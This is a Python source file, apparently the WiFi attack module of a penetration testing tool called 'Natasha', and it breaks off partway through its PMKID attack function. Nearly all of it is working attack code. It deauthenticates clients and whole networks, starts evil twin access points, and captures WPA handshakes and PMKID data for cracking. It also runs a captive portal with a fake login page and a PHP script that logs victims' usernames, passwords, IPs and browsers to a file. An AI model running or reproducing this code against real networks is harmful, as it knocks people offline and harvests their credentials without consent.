#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Natasha AI Penetration Testing Tool
WiFi Attack Module

This module implements WiFi attack capabilities similar to the WiFi Pineapple,
including network scanning, deauthentication attacks, evil twin AP creation,
and man-in-the-middle attacks.
"""

import os
import time
import signal
import logging
import threading
import subprocess
import re
import json
import random
import tempfile
from typing import Dict, List, Tuple, Optional, Union, Any
from enum import Enum

class WiFiInterface:
    """Class representing a WiFi interface."""
    
    def __init__(self, name: str, mac: str, is_monitor: bool = False):
        """Initialize a WiFi interface.
        
        Args:
            name: Interface name (e.g., wlan0)
            mac: MAC address
            is_monitor: Whether the interface is in monitor mode
        """
        self.name = name
        self.mac = mac
        self.is_monitor = is_monitor
        self.original_name = name

class AccessPoint:
    """Class representing a WiFi access point."""
    
    def __init__(self, ssid: str, bssid: str, channel: int, encryption: str, signal: int):
        """Initialize an access point.
        
        Args:
            ssid: Network name
            bssid: MAC address of the AP
            channel: WiFi channel
            encryption: Encryption type (WPA, WPA2, WEP, OPN)
            signal: Signal strength in dBm
        """
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.encryption = encryption
        self.signal = signal
        self.clients = []  # List of associated client MAC addresses

class Client:
    """Class representing a WiFi client."""
    
    def __init__(self, mac: str, ap_bssid: str, signal: int):
        """Initialize a client.
        
        Args:
            mac: MAC address of the client
            ap_bssid: MAC address of the associated AP
            signal: Signal strength in dBm
        """
        self.mac = mac
        self.ap_bssid = ap_bssid
        self.signal = signal
        self.probes = []  # List of SSIDs the client has probed for

class AttackType(Enum):
    """Enumeration of WiFi attack types."""
    DEAUTH = "deauth"
    EVIL_TWIN = "evil_twin"
    CAPTIVE_PORTAL = "captive_portal"
    HANDSHAKE_CAPTURE = "handshake_capture"
    PASSIVE_MONITOR = "passive_monitor"
    PMKID_ATTACK = "pmkid_attack"
    NETWORK_SCAN = "network_scan"
    CLIENT_SCAN = "client_scan"
    CHANNEL_ANALYSIS = "channel_analysis"
    WPS_SCAN = "wps_scan"

class WiFiAttack:
    """WiFi attack module for Natasha AI Penetration Testing Tool."""
    
    def __init__(self, interface_name: str = "wlan1"):
        """Initialize the WiFi attack module.
        
        Args:
            interface_name: Name of the WiFi interface to use
        """
        self.interface_name = interface_name
        self.interface = None
        self.monitor_interface = None
        self.access_points = {}  # BSSID -> AccessPoint
        self.clients = {}  # MAC -> Client
        self.lock = threading.Lock()
        self.scan_thread = None
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.attack_status = {}
        self.capture_dir = os.path.join(os.path.expanduser("~"), "natasha", "captures")
        self.analysis_dir = os.path.join(os.path.expanduser("~"), "natasha", "analysis")
        self.scan_results = {}
        self.channel_stats = {}
        self.encryption_stats = {}
        self.client_stats = {}
        self.wps_enabled_networks = {}
        self.hidden_networks = {}
        self.scan_history = []
        
        # Ensure directories exist
        os.makedirs(self.capture_dir, exist_ok=True)
        os.makedirs(self.analysis_dir, exist_ok=True)
        
        # Initialize the interface
        self._init_interface()
    
    def _init_interface(self) -> None:
        """Initialize the WiFi interface."""
        try:
            # Check if interface exists
            if not self._interface_exists(self.interface_name):
                logging.error(f"WiFi interface {self.interface_name} not found")
                available = self._get_available_interfaces()
                if available:
                    logging.info(f"Available interfaces: {', '.join(available)}")
                    # Try to use the first available interface
                    self.interface_name = available[0]
                    logging.info(f"Using {self.interface_name} instead")
                else:
                    logging.error("No WiFi interfaces available")
                    raise RuntimeError("No WiFi interfaces available")
            
            # Get interface MAC address
            mac = self._get_interface_mac(self.interface_name)
            if not mac:
                logging.error(f"Could not get MAC address for {self.interface_name}")
                raise RuntimeError(f"Could not get MAC address for {self.interface_name}")
            
            # Create interface object
            self.interface = WiFiInterface(self.interface_name, mac)
            logging.info(f"Initialized WiFi interface {self.interface_name} ({mac})")
        except Exception as e:
            logging.error(f"Failed to initialize WiFi interface: {e}")
            raise
    
    def _interface_exists(self, interface_name: str) -> bool:
        """Check if a network interface exists.
        
        Args:
            interface_name: Name of the interface to check
            
        Returns:
            True if the interface exists, False otherwise
        """
        try:
            output = subprocess.check_output(["ip", "link", "show", interface_name], 
                                           stderr=subprocess.STDOUT).decode('utf-8')
            return interface_name in output
        except subprocess.CalledProcessError:
            return False
    
    def _get_available_interfaces(self) -> List[str]:
        """Get a list of available wireless interfaces.
        
        Returns:
            List of interface names
        """
        try:
            output = subprocess.check_output(["iw", "dev"], 
                                           stderr=subprocess.STDOUT).decode('utf-8')
            interfaces = []
            for line in output.split('\n'):
                if 'Interface' in line:
                    interfaces.append(line.split()[-1])
            return interfaces
        except subprocess.CalledProcessError:
            return []
    
    def _get_interface_mac(self, interface_name: str) -> str:
        """Get the MAC address of a network interface.
        
        Args:
            interface_name: Name of the interface
            
        Returns:
            MAC address as a string
        """
        try:
            output = subprocess.check_output(["ip", "link", "show", interface_name], 
                                           stderr=subprocess.STDOUT).decode('utf-8')
            match = re.search(r'link/ether\s+([0-9a-f:]{17})', output)
            if match:
                return match.group(1)
            return ""
        except subprocess.CalledProcessError:
            return ""
    
    def _enable_monitor_mode(self) -> bool:
        """Enable monitor mode on the WiFi interface.
        
        Returns:
            True if successful, False otherwise
        """
        if self.monitor_interface is not None:
            logging.info(f"Monitor mode already enabled on {self.monitor_interface.name}")
            return True
        
        try:
            # Check if airmon-ng is available
            try:
                subprocess.check_output(["which", "airmon-ng"], stderr=subprocess.STDOUT)
                use_airmon = True
            except subprocess.CalledProcessError:
                use_airmon = False
            
            if use_airmon:
                # Use airmon-ng to enable monitor mode
                logging.info(f"Enabling monitor mode on {self.interface.name} using airmon-ng")
                
                # Kill interfering processes
                subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Start monitor mode
                output = subprocess.check_output(["airmon-ng", "start", self.interface.name], 
                                               stderr=subprocess.STDOUT).decode('utf-8')
                
                # Extract the monitor interface name
                match = re.search(r'(mon[0-9]+|wlan[0-9]+mon)', output)
                if match:
                    monitor_name = match.group(1)
                else:
                    monitor_name = f"{self.interface.name}mon"
                
                # Verify monitor interface exists
                if not self._interface_exists(monitor_name):
                    logging.error(f"Monitor interface {monitor_name} not found after enabling monitor mode")
                    return False
                
                # Get MAC address of monitor interface
                mac = self._get_interface_mac(monitor_name)
                
                # Create monitor interface object
                self.monitor_interface = WiFiInterface(monitor_name, mac, True)
                logging.info(f"Monitor mode enabled on {monitor_name}")
                return True
            else:
                # Use iw to enable monitor mode
                logging.info(f"Enabling monitor mode on {self.interface.name} using iw")
                
                # Bring down the interface
                subprocess.run(["ip", "link", "set", self.interface.name, "down"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Set monitor mode
                subprocess.run(["iw", "dev", self.interface.name, "set", "monitor", "none"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Bring up the interface
                subprocess.run(["ip", "link", "set", self.interface.name, "up"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Verify monitor mode
                output = subprocess.check_output(["iw", "dev", self.interface.name, "info"], 
                                               stderr=subprocess.STDOUT).decode('utf-8')
                if "type monitor" in output:
                    # Create monitor interface object (same interface, just in monitor mode)
                    self.monitor_interface = WiFiInterface(self.interface.name, self.interface.mac, True)
                    logging.info(f"Monitor mode enabled on {self.interface.name}")
                    return True
                else:
                    logging.error("Failed to enable monitor mode")
                    return False
        except Exception as e:
            logging.error(f"Failed to enable monitor mode: {e}")
            return False
    
    def _disable_monitor_mode(self) -> bool:
        """Disable monitor mode on the WiFi interface.
        
        Returns:
            True if successful, False otherwise
        """
        if self.monitor_interface is None:
            logging.info("Monitor mode not enabled")
            return True
        
        try:
            # Check if airmon-ng is available
            try:
                subprocess.check_output(["which", "airmon-ng"], stderr=subprocess.STDOUT)
                use_airmon = True
            except subprocess.CalledProcessError:
                use_airmon = False
            
            if use_airmon:
                # Use airmon-ng to disable monitor mode
                logging.info(f"Disabling monitor mode on {self.monitor_interface.name} using airmon-ng")
                subprocess.run(["airmon-ng", "stop", self.monitor_interface.name], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                # Use iw to disable monitor mode
                logging.info(f"Disabling monitor mode on {self.monitor_interface.name} using iw")
                
                # Bring down the interface
                subprocess.run(["ip", "link", "set", self.monitor_interface.name, "down"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Set managed mode
                subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "type", "managed"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Bring up the interface
                subprocess.run(["ip", "link", "set", self.monitor_interface.name, "up"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Reset monitor interface
            self.monitor_interface = None
            logging.info("Monitor mode disabled")
            return True
        except Exception as e:
            logging.error(f"Failed to disable monitor mode: {e}")
            return False
    
    def scan_networks(self, duration: int = 30) -> Dict[str, AccessPoint]:
        """Scan for WiFi networks.
        
        Args:
            duration: Scan duration in seconds
            
        Returns:
            Dictionary of access points (BSSID -> AccessPoint)
        """
        with self.lock:
            # Clear previous scan results
            self.access_points = {}
            self.clients = {}
            
            # Enable monitor mode
            if not self._enable_monitor_mode():
                logging.error("Failed to enable monitor mode for scanning")
                return {}
            
            try:
                # Create temporary file for airodump output
                with tempfile.NamedTemporaryFile(prefix="natasha_scan_", suffix=".csv", delete=False) as temp_file:
                    temp_prefix = temp_file.name[:-4]  # Remove .csv extension
                
                # Start airodump-ng for scanning
                logging.info(f"Starting network scan for {duration} seconds")
                airodump_cmd = [
                    "airodump-ng",
                    "--output-format", "csv",
                    "--write", temp_prefix,
                    self.monitor_interface.name
                ]
                
                airodump_process = subprocess.Popen(
                    airodump_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Wait for scan duration
                time.sleep(duration)
                
                # Stop airodump-ng
                airodump_process.send_signal(signal.SIGTERM)
                airodump_process.wait()
                
                # Parse scan results
                csv_file = f"{temp_prefix}-01.csv"
                if os.path.exists(csv_file):
                    self._parse_airodump_csv(csv_file)
                    os.unlink(csv_file)
                
                # Clean up any other files created by airodump
                for f in os.listdir(os.path.dirname(temp_prefix)):
                    if f.startswith(os.path.basename(temp_prefix)):
                        try:
                            os.unlink(os.path.join(os.path.dirname(temp_prefix), f))
                        except:
                            pass
                
                logging.info(f"Scan completed: found {len(self.access_points)} APs and {len(self.clients)} clients")
                return self.access_points
            except Exception as e:
                logging.error(f"Error during network scan: {e}")
                return {}
    
    def _parse_airodump_csv(self, csv_file: str) -> None:
        """Parse airodump-ng CSV output file.
        
        Args:
            csv_file: Path to the CSV file
        """
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Split the file into AP and client sections
            sections = content.split("\r\n\r\n")
            if len(sections) < 2:
                sections = content.split("\n\n")
            
            if len(sections) < 2:
                logging.warning("Could not parse airodump CSV file correctly")
                return
            
            ap_section = sections[0]
            client_section = sections[1]
            
            # Parse APs
            ap_lines = ap_section.strip().split('\n')
            if len(ap_lines) < 2:
                return
            
            for line in ap_lines[1:]:  # Skip header line
                if not line.strip():
                    continue
                
                # Parse AP line
                fields = line.split(',')
                if len(fields) < 14:
                    continue
                
                bssid = fields[0].strip()
                if not bssid or bssid == "BSSID":
                    continue
                
                try:
                    # Extract AP information
                    first_seen = fields[1].strip()
                    last_seen = fields[2].strip()
                    channel = int(fields[3].strip())
                    speed = fields[4].strip()
                    privacy = fields[5].strip()
                    cipher = fields[6].strip()
                    authentication = fields[7].strip()
                    power = int(fields[8].strip()) if fields[8].strip() else 0
                    beacons = int(fields[9].strip()) if fields[9].strip() else 0
                    iv = int(fields[10].strip()) if fields[10].strip() else 0
                    lan_ip = fields[11].strip()
                    id_length = int(fields[12].strip()) if fields[12].strip() else 0
                    essid = fields[13].strip().strip('"')
                    
                    # Create AccessPoint object
                    ap = AccessPoint(
                        ssid=essid,
                        bssid=bssid,
                        channel=channel,
                        encryption=privacy,
                        signal=power
                    )
                    
                    self.access_points[bssid] = ap
                except Exception as e:
                    logging.warning(f"Error parsing AP line: {e}")
            
            # Parse clients
            client_lines = client_section.strip().split('\n')
            if len(client_lines) < 2:
                return
            
            for line in client_lines[1:]:  # Skip header line
                if not line.strip():
                    continue
                
                # Parse client line
                fields = line.split(',')
                if len(fields) < 6:
                    continue
                
                mac = fields[0].strip()
                if not mac or mac == "Station MAC":
                    continue
                
                try:
                    # Extract client information
                    first_seen = fields[1].strip()
                    last_seen = fields[2].strip()
                    power = int(fields[3].strip()) if fields[3].strip() else 0
                    packets = int(fields[4].strip()) if fields[4].strip() else 0
                    bssid = fields[5].strip()
                    
                    # Create Client object
                    client = Client(
                        mac=mac,
                        ap_bssid=bssid,
                        signal=power
                    )
                    
                    self.clients[mac] = client
                    
                    # Add client to AP's client list
                    if bssid in self.access_points and bssid != "(not associated)":
                        self.access_points[bssid].clients.append(mac)
                    
                    # Parse probed ESSIDs
                    if len(fields) > 6:
                        probes = [p.strip().strip('"') for p in fields[6:] if p.strip()]
                        client.probes = probes
                except Exception as e:
                    logging.warning(f"Error parsing client line: {e}")
        except Exception as e:
            logging.error(f"Error parsing airodump CSV file: {e}")
    
    def start_continuous_scan(self, callback=None) -> None:
        """Start continuous network scanning in a background thread.
        
        Args:
            callback: Function to call with scan results after each scan
        """
        if self.scan_thread and self.scan_thread.is_alive():
            logging.warning("Continuous scan already running")
            return
        
        self.stop_event.clear()
        
        def scan_worker():
            logging.info("Starting continuous network scan")
            while not self.stop_event.is_set():
                try:
                    results = self.scan_networks(duration=10)
                    if callback:
                        callback(results)
                except Exception as e:
                    logging.error(f"Error in continuous scan: {e}")
                    if self.stop_event.is_set():
                        break
                    time.sleep(5)  # Wait before retrying
            
            logging.info("Continuous scan stopped")
        
        self.scan_thread = threading.Thread(target=scan_worker)
        self.scan_thread.daemon = True
        self.scan_thread.start()
    
    def stop_continuous_scan(self) -> None:
        """Stop continuous network scanning."""
        if not self.scan_thread or not self.scan_thread.is_alive():
            logging.warning("No continuous scan running")
            return
        
        logging.info("Stopping continuous scan")
        self.stop_event.set()
        self.scan_thread.join(timeout=15)
        if self.scan_thread.is_alive():
            logging.warning("Continuous scan thread did not terminate gracefully")
    
    def deauth_client(self, ap_bssid: str, client_mac: str, count: int = 5) -> bool:
        """Send deauthentication packets to a client.
        
        Args:
            ap_bssid: MAC address of the access point
            client_mac: MAC address of the client
            count: Number of deauth packets to send
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Enable monitor mode
            if not self._enable_monitor_mode():
                logging.error("Failed to enable monitor mode for deauth attack")
                return False
            
            try:
                # Get AP channel
                ap = self.access_points.get(ap_bssid)
                if ap:
                    channel = ap.channel
                else:
                    logging.warning(f"AP {ap_bssid} not found in scan results, using channel 1")
                    channel = 1
                
                # Set channel
                subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "channel", str(channel)], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Send deauth packets
                logging.info(f"Sending {count} deauth packets to {client_mac} from AP {ap_bssid}")
                aireplay_cmd = [
                    "aireplay-ng",
                    "--deauth", str(count),
                    "-a", ap_bssid,
                    "-c", client_mac,
                    self.monitor_interface.name
                ]
                
                subprocess.run(aireplay_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logging.info("Deauth attack completed")
                return True
            except Exception as e:
                logging.error(f"Error during deauth attack: {e}")
                return False
    
    def deauth_network(self, ap_bssid: str, count: int = 5) -> bool:
        """Send deauthentication packets to all clients on a network.
        
        Args:
            ap_bssid: MAC address of the access point
            count: Number of deauth packets to send
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Enable monitor mode
            if not self._enable_monitor_mode():
                logging.error("Failed to enable monitor mode for deauth attack")
                return False
            
            try:
                # Get AP channel
                ap = self.access_points.get(ap_bssid)
                if ap:
                    channel = ap.channel
                else:
                    logging.warning(f"AP {ap_bssid} not found in scan results, using channel 1")
                    channel = 1
                
                # Set channel
                subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "channel", str(channel)], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Send broadcast deauth packets
                logging.info(f"Sending {count} broadcast deauth packets for AP {ap_bssid}")
                aireplay_cmd = [
                    "aireplay-ng",
                    "--deauth", str(count),
                    "-a", ap_bssid,
                    self.monitor_interface.name
                ]
                
                subprocess.run(aireplay_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logging.info("Broadcast deauth attack completed")
                return True
            except Exception as e:
                logging.error(f"Error during broadcast deauth attack: {e}")
                return False
    
    def start_evil_twin(self, ssid: str, channel: int = 1, encryption: str = "none") -> bool:
        """Start an evil twin access point.
        
        Args:
            ssid: SSID of the evil twin
            channel: WiFi channel to use
            encryption: Encryption type (none, wep, wpa, wpa2)
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Stop any running attacks
            self.stop_attack()
            
            try:
                # Create hostapd configuration
                hostapd_conf = f"""
interface={self.interface.name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
                
                # Add encryption configuration if needed
                if encryption != "none":
                    if encryption == "wep":
                        # WEP configuration
                        wep_key = ''.join(random.choice('0123456789ABCDEF') for _ in range(10))
                        hostapd_conf += f"""
wep_default_key=0
wep_key0="{wep_key}"
"""
                    elif encryption in ["wpa", "wpa2"]:
                        # WPA/WPA2 configuration
                        wpa_passphrase = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(12))
                        hostapd_conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase={wpa_passphrase}
"""
                
                # Write configuration to temporary file
                hostapd_conf_file = os.path.join(tempfile.gettempdir(), "natasha_hostapd.conf")
                with open(hostapd_conf_file, 'w') as f:
                    f.write(hostapd_conf)
                
                # Start hostapd
                logging.info(f"Starting evil twin AP with SSID '{ssid}' on channel {channel}")
                hostapd_cmd = ["hostapd", hostapd_conf_file]
                
                hostapd_process = subprocess.Popen(
                    hostapd_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for hostapd to start
                time.sleep(2)
                
                # Check if hostapd is running
                if hostapd_process.poll() is not None:
                    stderr = hostapd_process.stderr.read().decode('utf-8')
                    logging.error(f"Failed to start hostapd: {stderr}")
                    return False
                
                # Store attack status
                self.attack_status = {
                    "type": AttackType.EVIL_TWIN.value,
                    "ssid": ssid,
                    "channel": channel,
                    "encryption": encryption,
                    "process": hostapd_process,
                    "conf_file": hostapd_conf_file
                }
                
                logging.info(f"Evil twin AP '{ssid}' started successfully")
                return True
            except Exception as e:
                logging.error(f"Error starting evil twin AP: {e}")
                return False
    
    def start_captive_portal(self, ssid: str, channel: int = 1, portal_type: str = "generic") -> bool:
        """Start a captive portal for credential harvesting.
        
        Args:
            ssid: SSID of the access point
            channel: WiFi channel to use
            portal_type: Type of captive portal (generic, google, facebook, etc.)
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Stop any running attacks
            self.stop_attack()
            
            try:
                # Create hostapd configuration
                hostapd_conf = f"""
interface={self.interface.name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
                
                # Write configuration to temporary file
                hostapd_conf_file = os.path.join(tempfile.gettempdir(), "natasha_hostapd.conf")
                with open(hostapd_conf_file, 'w') as f:
                    f.write(hostapd_conf)
                
                # Create dnsmasq configuration
                dnsmasq_conf = """
interface={}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.1.1
""".format(self.interface.name)
                
                # Write configuration to temporary file
                dnsmasq_conf_file = os.path.join(tempfile.gettempdir(), "natasha_dnsmasq.conf")
                with open(dnsmasq_conf_file, 'w') as f:
                    f.write(dnsmasq_conf)
                
                # Configure interface
                subprocess.run(["ip", "link", "set", self.interface.name, "down"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["ip", "addr", "flush", "dev", self.interface.name], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", self.interface.name], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["ip", "link", "set", self.interface.name, "up"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Enable IP forwarding
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Configure iptables
                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface.name, "-o", "eth0", "-j", "ACCEPT"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["iptables", "-A", "FORWARD", "-i", "eth0", "-o", self.interface.name, "-m", "state", 
                              "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Redirect all HTTP traffic to captive portal
                subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface.name, 
                              "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Start hostapd
                logging.info(f"Starting captive portal with SSID '{ssid}' on channel {channel}")
                hostapd_process = subprocess.Popen(
                    ["hostapd", hostapd_conf_file],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for hostapd to start
                time.sleep(2)
                
                # Check if hostapd is running
                if hostapd_process.poll() is not None:
                    stderr = hostapd_process.stderr.read().decode('utf-8')
                    logging.error(f"Failed to start hostapd: {stderr}")
                    return False
                
                # Start dnsmasq
                dnsmasq_process = subprocess.Popen(
                    ["dnsmasq", "-C", dnsmasq_conf_file, "-d"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for dnsmasq to start
                time.sleep(2)
                
                # Check if dnsmasq is running
                if dnsmasq_process.poll() is not None:
                    stderr = dnsmasq_process.stderr.read().decode('utf-8')
                    logging.error(f"Failed to start dnsmasq: {stderr}")
                    hostapd_process.terminate()
                    return False
                
                # Create and start web server for captive portal
                portal_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), "portals", portal_type)
                if not os.path.exists(portal_dir):
                    portal_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), "portals", "generic")
                    if not os.path.exists(portal_dir):
                        # Create a basic portal
                        portal_dir = os.path.join(tempfile.gettempdir(), "natasha_portal")
                        os.makedirs(portal_dir, exist_ok=True)
                        
                        # Create index.html
                        with open(os.path.join(portal_dir, "index.html"), 'w') as f:
                            f.write("""
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background-color: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 3px; }
        button { width: 100%; padding: 10px; background-color: #4285f4; color: white; border: none; border-radius: 3px; cursor: pointer; }
        button:hover { background-color: #3367d6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Login Required</h1>
        <p>Please enter your credentials to access the internet.</p>
        <form action="login.php" method="post">
            <div class="form-group">
                <label for="username">Username or Email:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
""")
                        
                        # Create login.php
                        with open(os.path.join(portal_dir, "login.php"), 'w') as f:
                            f.write("""
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$date = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$log_entry = "Date: $date\\nIP: $ip\\nUser-Agent: $user_agent\\nUsername: $username\\nPassword: $password\\n\\n";
file_put_contents('credentials.log', $log_entry, FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background-color: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>Connecting...</h1>
        <div class="loader"></div>
        <p style="text-align: center;">Please wait while we verify your credentials...</p>
    </div>
</body>
</html>
""")
                
                # Start PHP web server
                php_process = subprocess.Popen(
                    ["php", "-S", "192.168.1.1:80", "-t", portal_dir],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for PHP server to start
                time.sleep(2)
                
                # Check if PHP server is running
                if php_process.poll() is not None:
                    stderr = php_process.stderr.read().decode('utf-8')
                    logging.error(f"Failed to start PHP server: {stderr}")
                    hostapd_process.terminate()
                    dnsmasq_process.terminate()
                    return False
                
                # Store attack status
                self.attack_status = {
                    "type": AttackType.CAPTIVE_PORTAL.value,
                    "ssid": ssid,
                    "channel": channel,
                    "portal_type": portal_type,
                    "portal_dir": portal_dir,
                    "hostapd_process": hostapd_process,
                    "dnsmasq_process": dnsmasq_process,
                    "php_process": php_process,
                    "hostapd_conf_file": hostapd_conf_file,
                    "dnsmasq_conf_file": dnsmasq_conf_file
                }
                
                logging.info(f"Captive portal with SSID '{ssid}' started successfully")
                return True
            except Exception as e:
                logging.error(f"Error starting captive portal: {e}")
                return False
    
    def start_handshake_capture(self, ap_bssid: str, channel: int, ssid: str = None) -> bool:
        """Start capturing WPA handshakes for a specific access point.
        
        Args:
            ap_bssid: MAC address of the access point
            channel: WiFi channel of the access point
            ssid: SSID of the access point (optional)
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Stop any running attacks
            self.stop_attack()
            
            # Enable monitor mode
            if not self._enable_monitor_mode():
                logging.error("Failed to enable monitor mode for handshake capture")
                return False
            
            try:
                # Create output directory
                capture_dir = os.path.join(self.capture_dir, "handshakes")
                os.makedirs(capture_dir, exist_ok=True)
                
                # Generate output filename
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                if ssid:
                    output_prefix = os.path.join(capture_dir, f"{ssid.replace(' ', '_')}_{timestamp}")
                else:
                    output_prefix = os.path.join(capture_dir, f"{ap_bssid.replace(':', '')}_{timestamp}")
                
                # Start airodump-ng for handshake capture
                logging.info(f"Starting handshake capture for AP {ap_bssid} on channel {channel}")
                airodump_cmd = [
                    "airodump-ng",
                    "--bssid", ap_bssid,
                    "--channel", str(channel),
                    "--write", output_prefix,
                    "--output-format", "pcap,csv",
                    self.monitor_interface.name
                ]
                
                airodump_process = subprocess.Popen(
                    airodump_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Wait for airodump to start
                time.sleep(2)
                
                # Store attack status
                self.attack_status = {
                    "type": AttackType.HANDSHAKE_CAPTURE.value,
                    "ap_bssid": ap_bssid,
                    "channel": channel,
                    "ssid": ssid,
                    "output_prefix": output_prefix,
                    "airodump_process": airodump_process
                }
                
                logging.info(f"Handshake capture for AP {ap_bssid} started successfully")
                return True
            except Exception as e:
                logging.error(f"Error starting handshake capture: {e}")
                return False
    
    def start_pmkid_attack(self, ap_bssid: str, channel: int, ssid: str = None) -> bool:
        """Start a PMKID attack against a specific access point.
        
        Args:
            ap_bssid: MAC address of the access point
            channel: WiFi channel of the access point
            ssid: SSID of the access point (optional)
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Stop any running attacks
            self.stop_attack()
            
            # Enable monitor mode
            if not self._enable_monitor_mode():
                logging.error("Failed to enable monitor mode for PMKID attack")
                return False
            
            try:
                # Check if hcxdumptool is available
                try:
                    subprocess.check_output(["which", "hcxdumptool"], stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError:
                    logging.error("hcxdumptool not found. Please install it first.")
                    return False
                
                # Create output directory
                capture_dir = os.path.join(self.capture_dir, "pmkid")
                os.makedirs(capture_dir, exist_ok=True)
                
                # Generate output filename
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                if ssid:
                    output_file = os.path.join(capture_dir, f"{ssid.replace(' ', '_')}_{timestamp}.pcapng")
                else:
                    output_file = os.path.join(capture_dir, f"{ap_bssid.replace(':', '')}_{timestamp}.pcapng")
                
                # Start hcxdumptool for PMKID attack
                logging.info(f"Starting PMKID attack for AP {ap_bssid} on channel {channel}")
                hcxdumptool_cmd = [
                    "hcxdumptool",
                    "-i", self.monitor_interface.name,
